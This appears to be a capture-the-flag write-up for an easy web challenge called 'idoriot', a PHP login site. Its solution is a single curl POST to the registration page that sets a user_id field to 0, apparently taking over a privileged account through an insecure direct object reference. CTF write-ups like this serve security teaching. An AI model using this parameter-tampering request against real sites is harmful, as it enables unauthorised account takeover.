# idoriot
**Category:** Web
**Difficulty:** Easy
**Author:** tirefire

## Description

Some idiot made this web site that you can log in to. The idiot even made it in php. I dunno.

## Distribution

- link

## Solution

- curl -iL 'http://2023.imaginaryctf.org/idoriot/register.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=something&password=somethingelse&user_id=0'
- now log in as something:somethingelse and get flag
